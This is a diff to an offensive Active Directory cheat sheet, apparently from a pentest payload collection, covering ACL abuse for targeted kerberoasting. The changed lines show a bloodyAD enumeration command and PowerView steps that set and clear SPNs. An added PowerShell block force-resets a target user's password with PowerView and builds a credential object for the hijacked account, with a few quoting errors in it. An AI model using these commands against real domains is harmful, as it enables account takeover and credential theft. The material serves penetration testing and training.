@@ -49,9 +49,9 @@ An **Access Control List (ACL)** is a collection of Access Control Entries (ACEs
 
 We can set a **SPN** on a target account, request a Service Ticket (ST), then grab its hash and kerberoast it.
 
-* Windows/Linux
+* **Using BloodyAD and Impacket**  
 
-  ```ps1
+  ```bash
   # Check for interesting permissions on accounts:
   bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' get writable --otype USER --right WRITE --detail | egrep -i 'distinguishedName|servicePrincipalName'
 
@@ -89,6 +89,22 @@ We can set a **SPN** on a target account, request a Service Ticket (ST), then gr
 
   # Remove the SPN
   PowerView2 > Set-DomainObject -Identity username -Clear serviceprincipalname
+  ```
+* **Usering Basic Powershell**  
+  ```powershell
+  # Create PSCredential Object
+  $SecPassword = ConvertTo-SecureString '<password here>' -AsPlainText -Force
+  $Cred = New-Object System.Management.Automation.PSCredential('<domain\username'>, $SecPassword)
+
+  # Create Secure String Password for the Target Account
+  $TargetPass = ConvertTo-SecureString '<password here>' -AsPlainText -Force
+
+  # Use Powerview to change the password
+  Import-Module .\Powerview.ps1
+  Set-DomainUserPassword -Identity <target username> -AccountPassword $TargetPass -Credential $Cred -Verbose
+
+  # Create a new credential object with the target's Credentials
+  $Cred2 = New-Object System.Management.Automation.PSCredential(<domain\username'>, $TargetPass)
   ```
 
 We can change a victim's **userAccountControl** to not require Kerberos preauthentication, grab the user's crackable AS-REP, and then change the setting back.
